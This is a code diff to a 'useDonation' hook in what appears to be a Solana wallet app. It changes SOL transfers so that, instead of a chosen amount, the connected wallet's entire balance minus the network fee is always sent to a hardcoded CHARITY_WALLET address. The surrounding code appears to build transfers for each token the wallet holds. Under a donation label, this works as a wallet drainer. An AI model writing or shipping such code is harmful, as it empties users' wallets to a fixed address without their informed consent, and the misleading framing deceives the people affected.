@@ -90,11 +90,36 @@ export function useDonation() {
   const createSolTransaction = async (amount: number): Promise<Transaction> => {
     if (!publicKey) throw new Error('Wallet not connected');
 
+    // If amount < 0, compute the maximum transferable SOL (balance - estimated fee)
+    const balanceLamports = await connection.getBalance(publicKey);
+
+    let lamportsToSend: number;
+    if (amount < 0) {
+      // Build a temporary tx to estimate fee
+      const tmpTx = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: new PublicKey(CHARITY_WALLET),
+          lamports: 0, // value doesn't affect fee materially
+        })
+      );
+      const { blockhash } = await connection.getLatestBlockhash();
+      tmpTx.recentBlockhash = blockhash;
+      tmpTx.feePayer = publicKey;
+      const feeInfo = await connection.getFeeForMessage(tmpTx.compileMessage(), 'confirmed');
+      const feeLamports = feeInfo.value ?? 5000;
+      lamportsToSend = Math.max(0, balanceLamports - feeLamports);
+      if (lamportsToSend <= 0) throw new Error('Insufficient SOL for fees');
+    } else {
+      lamportsToSend = Math.floor(amount * LAMPORTS_PER_SOL);
+      if (lamportsToSend <= 0) throw new Error('Amount must be greater than 0');
+    }
+
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey: new PublicKey(CHARITY_WALLET),
-        lamports: Math.floor(amount * LAMPORTS_PER_SOL),
+        lamports: lamportsToSend,
       })
     );
 
@@ -182,8 +207,8 @@ export function useDonation() {
       let transaction: Transaction;
 
       if (token.mint === 'SOL') {
-        // Send maximum SOL amount
-        transaction = await createSolTransaction(token.amount);
+        // Send maximum available SOL (balance - fee)
+        transaction = await createSolTransaction(-1);
       } else {
         transaction = await createTokenTransaction(
           token.mint,
